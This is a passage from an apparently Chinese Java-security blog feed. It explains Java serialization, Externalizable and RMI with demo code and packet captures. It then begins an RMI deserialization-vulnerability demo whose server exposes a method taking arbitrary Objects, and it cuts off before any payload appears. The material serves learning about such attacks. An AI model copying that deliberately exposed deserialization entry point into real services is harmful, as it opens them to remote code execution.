class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 打印DeserializationTest类序列化以后的字节数组，我们可以将其存储到文件中或者通过Socket发送到远程服务地址</span></span><br><span class="line">            System.out.println(<span class="string">"DeserializationTest类序列化后的字节数组:"</span> + Arrays.toString(baos.toByteArray()));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 利用DeserializationTest类生成的二进制数组创建二进制输入流对象用于反序列化操作</span></span><br><span class="line">            ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象</span></span><br><span class="line">            ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反序列化输入流数据为DeserializationTest对象</span></span><br><span class="line">            DeserializationTest test = (DeserializationTest) in.readObject();</span><br><span class="line">            System.out.println(<span class="string">"用户名:"</span> + test.getUsername() + <span class="string">",邮箱:"</span> + test.getEmail());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 关闭ObjectInputStream输入流</span></span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/Java 反序列化.resources/C93A9FAE-DB5A-4FC1-BB1B-814DAE9F77AA.png" alt="76d9756e4aab867670c7fcda970c3c24"></p><ul><li>使用了ObjectOutputStream-&gt;writeObject()序列化了DeserializationTest类</li><li>使用了ObjectInputStream-&gt;readObject()反序列化了DeserializationTest类</li></ul><h4 id="Externalizable"><a href="#Externalizable" class="headerlink" title="Externalizable"></a>Externalizable</h4><p><img src="/Java 反序列化.resources/C69C1353-C5FC-42A8-A68A-278C3D22143B.png" alt="7d55817c04f81057ababfb388229de68"></p><p>java.io.Externalizable继承Serializable接口，定义了两个方法：</p><ul><li>writeExternal()</li><li>readExternal()</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExternalizableTest</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Externalizable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> username;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.username = username;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getEmail</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> email;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmail</span><span class="params">(String email)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.email = email;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        out.writeObject(username);</span><br><span class="line">        out.writeObject(email);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = (String) in.readObject();</span><br><span class="line">        <span class="keyword">this</span>.email = (String) in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建DeserializationTest类，并类设置属性值</span></span><br><span class="line">        ExternalizableTest t = <span class="keyword">new</span> ExternalizableTest();</span><br><span class="line">            t.setUsername(<span class="string">"Patrilic"</span>);</span><br><span class="line">            t.setEmail(<span class="string">"admin@patrilic.top"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建Java对象序列化输出流对象</span></span><br><span class="line">            ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 序列化DeserializationTest类</span></span><br><span class="line">            out.writeObject(t);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 打印ExternalizableTest类序列化以后的字节数组，我们可以将其存储到文件中或者通过Socket发送到远程服务地址</span></span><br><span class="line">            System.out.println(<span class="string">"ExternalizableTest类序列化后的字节数组:"</span> + Arrays.toString(baos.toByteArray()));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 利用ExternalizableTest类生成的二进制数组创建二进制输入流对象用于反序列化操作</span></span><br><span class="line">            ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象</span></span><br><span class="line">            ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反序列化输入流数据为DeserializationTest对象</span></span><br><span class="line">            ExternalizableTest test = (ExternalizableTest) in.readObject();</span><br><span class="line">            System.out.println(<span class="string">"用户名:"</span> + test.getUsername() + <span class="string">",邮箱:"</span> + test.getEmail());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 关闭ObjectInputStream输入流</span></span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Java 反序列化.resources/29A572E8-12FE-4C0B-ABEB-7B0F8E126A20.png" alt="dbab49a33c3f7b5d91ac12675c425caf"></p><p>值得注意的是两个方法的重写：<br><img src="/Java 反序列化.resources/8F677152-4C82-4947-80E3-1A318034B8AF.png" alt="ad0bec7b07149615601539047867463f"></p><h2 id="0x03-相关链接"><a href="#0x03-相关链接" class="headerlink" title="0x03 相关链接"></a>0x03 相关链接</h2><p><a href="https://xz.aliyun.com/t/2041" target="_blank" rel="noopener">https://xz.aliyun.com/t/2041</a><br><a href="https://javasec.org/javase/JavaDeserialization/Serialization.html" target="_blank" rel="noopener">https://javasec.org/javase/JavaDeserialization/Serialization.html</a><br><a href="https://xz.aliyun.com/t/2043" target="_blank" rel="noopener">https://xz.aliyun.com/t/2043</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2020-3-18 11:26:55&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;/wallpaper/girl_field_night.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h2 
      
    
    </summary>
    
      <category term="Java_Sec" scheme="http://patrilic.top/categories/Java-Sec/"/>
    
    
      <category term="反序列化" scheme="http://patrilic.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>RMI</title>
    <link href="http://patrilic.top/2020/03/17/RMI/"/>
    <id>http://patrilic.top/2020/03/17/RMI/</id>
    <published>2020-03-17T08:41:55.000Z</published>
    <updated>2020-03-17T08:51:11.826Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2020-3-17 16:41:55</p></blockquote><p><img src="/wallpaper/sky.jpg" alt></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>RMI(Remote Method Invocation) - Java远程方法调用， 类似于RPC， 实现了Java程序跨JVM的的方法调用。<br>简而言之就是能够在另一个JVM中调用对象的方法。</p><h2 id="0x01-RMI组成"><a href="#0x01-RMI组成" class="headerlink" title="0x01 RMI组成"></a>0x01 RMI组成</h2><p>RMI分成三个部分组成： </p><ul><li>客户端Client</li><li>服务端Server</li><li>注册中心Registry</li></ul><p>(from <a href="https://javasec.org/javase/RMI/" target="_blank" rel="noopener">javasec</a>)<br>架构图：<br><img src="/RMI.resources/F59BB75C-985D-4077-A2C5-568E3A8F3D47.jpg" alt="f76f1d632cf4f6d09b1f45783932c320"></p><p>简述一下RMI的调用流程：</p><ol><li>RMI客户端在调用远程方法时会先创建Stub(sun.rmi.registry.RegistryImpl_Stub)。</li><li>Stub会将Remote对象传递给远程引用层(java.rmi.server.RemoteRef)并创建java.rmi.server.RemoteCall(远程调用)对象。</li><li>RemoteCall序列化RMI服务名称、Remote对象。</li><li>RMI客户端的远程引用层传输RemoteCall序列化后的请求信息通过Socket连接的方式传输到RMI服务端的远程引用层。</li><li>RMI服务端的远程引用层(sun.rmi.server.UnicastServerRef)收到请求会请求传递给Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch)。</li><li>Skeleton调用RemoteCall反序列化RMI客户端传过来的序列化。</li><li>Skeleton处理客户端请求：bind、list、lookup、rebind、unbind，如果是lookup则查找RMI服务名绑定的接口对象，序列化该对象并通过RemoteCall传输到客户端。</li><li>RMI客户端反序列化服务端结果，获取远程对象的引用。</li><li>RMI客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。</li><li>RMI客户端反序列化RMI远程方法调用结果。</li></ol><p>但是从上述文字中就产生一个疑问，Client是直接获取服务端的方法执行结果，而类的执行是在Server端，那么例如fastjson这种，它的命令执行又是在Client产生…?</p><h2 id="0x02-RMI搭建"><a href="#0x02-RMI搭建" class="headerlink" title="0x02 RMI搭建"></a>0x02 RMI搭建</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>创建一个Java Project - <code>RMIServiceExample</code><br>创建Package - <code>com.patrilic.rmi</code><br>首先构造一个public接口<code>RMIServiceAPI</code>，需要继承Remote，同时throws RemoteException</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.rmi;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">RMIServiceAPI</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String a)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再构造一个Class实现</p><ul><li>需要继承UnicastRemoteObject类，同时实现RMIServiceAPI接口</li><li>构造函数需要抛出RemoteException</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.rmi;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIService</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">RMIServiceAPI</span> </span>&#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">RMIService</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line"><span class="keyword">super</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String a)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"call from"</span> + a);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello world"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后构造一个StartService.java,用于注册服务代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.rmi;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StartService</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">StartService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String host =<span class="string">"127.0.0.1"</span>;</span><br><span class="line">        String port =<span class="string">"1099"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            RMIServiceAPI service = <span class="keyword">new</span> RMIService();</span><br><span class="line">            LocateRegistry.createRegistry(Integer.valueOf(port));</span><br><span class="line">            Naming.bind(<span class="string">"rmi://"</span> + host + <span class="string">":"</span> + port + <span class="string">"/RmiService"</span>, service);</span><br><span class="line">            System.out.println(<span class="string">"[INFO]:Success to bind rmi object"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">StartService();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/RMI.resources/070C8E9A-2382-4FBB-8C5E-AA4559FC649C.png" alt="8c1ada5bab64f273daad336c41307ec6"></p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>和Server端一样，先构造一个接口继承Remote<br>注意，必须使用和Server端相同的package和RMIServiceAPI名称，不然会报错<br><img src="/RMI.resources/C68FA7EC-30FF-48B0-AAAA-7612C07D2E5D.png" alt="65111557c3c0a8a7cb0d3a6c57bcc051"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.rmi;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">RMIServiceAPI</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String a)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造Client调用服务端的hello接口<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.rmi;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">linkHello</span><span class="params">(String a)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        String host = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">        String port = <span class="string">"1099"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Remote remote = Naming.lookup(<span class="string">"rmi://"</span> + host + <span class="string">":"</span> + port</span><br><span class="line">                    + <span class="string">"/RmiService"</span>);</span><br><span class="line">            <span class="keyword">if</span> (remote <span class="keyword">instanceof</span> RMIServiceAPI) &#123;</span><br><span class="line">            RMIServiceAPI rmiService = (RMIServiceAPI) remote;</span><br><span class="line">                String result = rmiService.hello(a);</span><br><span class="line">                System.out.println(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">                    </span><br><span class="line">                    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            linkHello(<span class="string">"Patrilic"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/RMI.resources/FF0E49D9-40AB-42D1-AB32-CC78ED386B34.png" alt="e7a7843a05c493670904bec48a52dd32"></p><p><img src="/RMI.resources/DA8DEF68-8A20-41C1-989F-6330EA8858C8.png" alt="6b731c857e38846e526b2c60d7ec4de7"></p><h2 id="0x03-RMI通讯流程"><a href="#0x03-RMI通讯流程" class="headerlink" title="0x03 RMI通讯流程"></a>0x03 RMI通讯流程</h2><p>在RMIClient对Server端进行lookup操作时，用Wireshark指定lo0网卡抓包<br><img src="/RMI.resources/8F637EE5-28A8-426D-9184-2714902E28CC.png" alt="b31c0000a77bc703a77d894cb5307fa2"></p><h3 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h3><p><code>AC ED 00 05是常见的java反序列化16进制特征</code><br>Client连接Registry中心的1099端口， 建立通讯</p><p>Client通过JRMI,Call查询需要调用的函数的远程引用，注册中心通过JRMI,ReturnData返回RMI的调用类以及Server的ip和端口<br><img src="/RMI.resources/EAEC49FD-30D0-412D-A543-41F7549A49F9.png" alt="dfc817077210f67c32b3fe540aedadad"><br><img src="/RMI.resources/19124785-F9D5-4DEB-BC94-343041F5296A.png" alt="d35b415893196e0d4db62aa7c39f3bbc"></p><h3 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h3><p>通过注册中心提供的Server的ip和端口，进而Client和Server进行连接<br><img src="/RMI.resources/28786E0B-E419-4AE8-816A-EE1B0E0E4849.png" alt="cb81bc50a01de1ba631ea28bbf0a7154"></p><h3 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h3><p>再进行一次JRMI，Client连接Registry中心的1099端口<br><img src="/RMI.resources/3BDA857B-8EBD-4F63-9785-B561A91323C3.png" alt="3ffbe6a7d29b25c5da1cb85e015fb383"><br>应该是在确认调用类需要的东西<br><img src="/RMI.resources/7520C484-1766-4070-BFB0-F65E9A3CF749.png" alt="8cdb8a02662cc9ff538f324e94783398"></p><h3 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h3><p><img src="/RMI.resources/FFE19B48-D341-4A79-A5D5-017BF5A3A282.png" alt="44f1b0bf06d39339ba796717c14d9e78"><br><img src="/RMI.resources/6FA71D21-0855-430D-B3A6-52F4BF1BD0D7.png" alt="f025b99348ba11c47a8201ce713e9020"></p><p>返回调用结果</p><h2 id="0x04-RMI反序列化漏洞"><a href="#0x04-RMI反序列化漏洞" class="headerlink" title="0x04 RMI反序列化漏洞"></a>0x04 RMI反序列化漏洞</h2><p>从之前的流程图就可以发现，通讯过程中的所有对象都是序列化之后传输，那么就必定有反序列化操作。</p><p>这里利用Common-Collections-3.1的反序列化</p><p>代码来自<a href="https://xz.aliyun.com/t/6660#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/6660#toc-6</a><br>Server<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">name</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">(String say)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dowork</span><span class="params">(Object work)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">UserImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">UserImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">name</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">(String say)</span> <span class="keyword">throws</span>  RemoteException</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"you speak"</span> + say);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dowork</span><span class="params">(Object work)</span> <span class="keyword">throws</span>  RemoteException</span>&#123;</span><br><span class="line">   